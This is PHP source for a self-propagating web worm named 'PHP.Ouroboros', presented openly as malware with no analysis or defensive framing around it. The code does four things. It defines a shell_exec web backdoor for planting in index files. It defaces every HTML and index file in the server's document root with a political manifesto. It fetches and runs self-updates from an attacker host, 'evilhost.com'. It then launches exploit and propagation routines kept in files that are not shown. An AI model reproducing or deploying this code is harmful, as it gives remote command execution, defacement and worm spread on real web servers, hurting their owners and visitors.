<?php

/*
[PHP.Ouroboros].core
By: Nomenumbra
*/

include("xploit.php");
include("viral.php");
include("rsa.php");

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 5);
ob_implicit_flush (1);

$MAIN = array();
$MAIN['os'] = 1;
$MAIN['content'] = '';
$MAIN['signature'] = '[..::OUROBOROS::..]';
$MAIN['backdoor'] = '<?php ini_set("max_execution_time",0);echo str_replace("\n","<br>",str_replace("<","&lt;",str_replace("<","&lt;",shell_exec($_GET[cmd])))?>';
$MAIN['bd'] = ' *index*'; // regular expression for file backdooring mask
$MAIN['changevars'] = array ('temp','content');
$MAIN['filedelimeter'] = '/';
$MAIN['searchlim'] = 1000;
$MAIN['update'] = 'http://www.evilhost.com/update.phps';
$MAIN['backupdir'] = '_defacebackup_'; // backup defaced files
$MAIN['vx_version'] = 1;
$MAIN['author'] = 'Nomenumbra';

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

function GenFileName()
{
  $result = '';
  $len = rand(2,4);
  for($i = 0; $i < $len; $i++)
    $result .= chr(rand(97,122));
  $result .= rand(1,9999).".php";
  return $result;  
}

function sendpacket($host,$port,$pAcKeT) // packet sending function
{
  $ock=fsockopen(gethostbyname($host),$port);
  if (!$ock)
    return "No response";
  fputs($ock,$pAcKeT);
  $HtMl='';
  while (!feof($ock)) {
    $HtMl.=fgets($ock);
  }
  fclose($ock);
  return $HtMl;
}

function Wget($url) // wget function, for updating
{
  $file = fopen($url, "r");
  $content = '';
  if (!$file)
    return 0;
  while (!feof ($file))
    $content .= fgets ($file, 1024);  
  fclose($file);
  fwrite(fopen(basename($url),"w"),$content);
  return basename($url);
}

function DefaceFile($file) // file defacing function
{
 $text .= "<html><body bgcolor = \"#000000\"><font color = red>";
 $text .= "<img src = \"http://ssevillano.free.fr/galerie_anarchisme_et_atheisme_16/images/anarchy.jpg\">";
 $text .= "<br><b>Everything you know is a lie.</b></br>";
 $text .= "<br>Cast your mind back to when you were a child. Remember how life shone out from within? How everything was new and full of golden hope?</br>";
 $text .= "<br>And then “they” got to you. The politicians – the priests – the CEOs – the parasites!</br>";
 $text .= "<br>This is politics: “Do what you’re told or we’ll punish you.“”</br>";
 $text .= "<br>This is religion: “Suffer misery now so you can be happy after death.”</br>";
 $text .= "<br>This is economics: “The world works like it works, there's nothing you can do about human nature, which is greedy!”</br>";
 $text .= "<br>None of these doctrines stands up to rational analysis.</br>";
 $text .= "<br>They won't protect you, they don't care about you as long as you consume</br>";
 $text .= "<br>Nowadays more and more hypocritical computer security industries arise, feeding on fear</br>";
 $text .= "<br>\"Watch out, hackers will destroy your files\", \"Watch out, viruses will make your life a hell\"</br>";
 $text .= "<br>They don't care about your safety, they don't care about the science behind computer security</br>";
 $text .= "<br>They only care about money, and I believe something like that is called a \"<b>Protection racket</b>\"</br>";
 $text .= "<br>This defacement should be enough proof of their incompetency, all files are in a backup directory, so you can't say we're mindless vessels of destruction, opposed to the parasitic powerbrokers</br>";
 $text .= "<br>You don’t believe me, do you? You live in a democracy. You vote for your leaders.</br>";
 $text .= "<br>So tell me – what happens if you want to disobey them?</br>";
 $text .= "<br>Say you don’t like the President. You object to paying taxes to support him, his family, his pets, his bodyguards and the friends he wangled jobs for. What do you do?</br>";
 $text .= "<br>Or say you don’t like your taxes being used to subsidize foreign arms sales for slaughter in the third world. How can you stop it?</br>";
 $text .= "<br>Vote for somebody else, whose policy is the same? Don’t vote?</br>";
 $text .= "<br>The government pretends to be there to serve you. In reality, it’s there to tell you what to do.</br>";
 $text .= "<br>If you refuse to obey, you’ll be investigated – arrested – criminalized.</br>";
 $text .= "<br>Your assets will be seized and given to the state. You will be jailed.</br>";
 $text .= "<br>Nowadays, for the first time in history, the parasites fully outpower the producers who support them.</br>";
 $text .= "<br>They’re entering a final feeding frenzy, which will result in the ultimate evil – <b>a totalitarian state.</b></br>";
 $text .= "<br><b><font size = 20>It's your choice, be a slave to the system that gives nothing back or stand up and fight for a better world!</font></b></br>";
 $text .= "</font></body></html>";
 $bckp = ".".$MAIN['filedelimeter'].$MAIN['backupdir'].$MAIN['filedelimeter'].basename($file)."_backup_";
 copy($file,$bckp);
 fwrite(fopen($file,"w"),$text);
}

function DefaceServer() // deface the server
{
 mkdir($MAIN['backupdir']);
 $dir = opendir($_SERVER['DOCUMENT_ROOT']);
 $defaceme = array('html','htm','shtml'); // deface every html file
 while ($dircontent = readdir($dir))
  { 
   for($i = 0; $i < count($defaceme); $i++)
    if(strtolower(substr(strrchr($cdir, "."), 1)) == $defaceme[$i])
      DefaceFile($_SERVER['DOCUMENT_ROOT'].$MAIN['filedelimeter'].$dircontent);
   if(eregi(" * index *",$dircontent)) // deface every index file for sure, no matter what extension
     DefaceFile($_SERVER['DOCUMENT_ROOT'].$MAIN['filedelimeter'].$dircontent);
  }
}

function Update() // update the worm
{
  $update = Wget($MAIN['update']);
  if($update)
  {
    $content = fread(fopen($update,"r"),filesize($update));      
    if(strstr($content,"\$MAIN['vx_version']"))
    {
      $temp = explode("\$MAIN['vx_version'] = ",$content);
      $temp = explode(";",$temp[1]);
      if ($temp[0] > $MAIN['vx_version'])
      {
        copy($update,__FILE__);
        unlink($update);
        include(__FILE__);
      }
    }
  }
}

function Init()// initialisation routine
{
  srand(make_seed());
  echo $MAIN['signature']; // echo signature to let the infector know we are here
  Update();
  $MAIN['filecontent'] = fread(fopen(__FILE__,'r'),filesize(__FILE__));
  if (stristr($_SERVER['SERVER_SOFTWARE'],"win32"))
  {
    $MAIN['os'] = 0; // windows
    $MAIN['filedelimeter'] = "\\";
  }
  else
  {
    $MAIN['os'] = 1; // *nix
    $MAIN['filedelimeter'] = "/";
  }
}

  Init();
  DefaceServer();
  AutoXploit(); // If only php had multi-threading ..... >=)
  Pr0pagate();

?>